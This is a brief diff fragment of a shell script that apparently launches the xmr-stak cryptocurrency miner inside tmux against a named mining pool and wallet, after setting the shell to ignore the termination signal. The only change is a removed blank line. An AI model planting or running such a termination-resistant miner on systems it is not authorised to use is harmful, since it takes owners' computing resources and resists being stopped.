@@ -12,4 +12,3 @@ expect ./expect-mg.sh
 tmux
 trap "" 15
 ./xmr-stak --currency cryptonight_lite_v7 -o spot.mineallcrypto.com:7586 -u AYrUmTkCNaTcKu3YyTqnwARJ5rpFwn1rodFsKji2hgcn11iGWXgRQ12fFLWE3DCL3Mg2QCfNY5pLcDLm6LVYTLwdF79gVUd   -p x
-
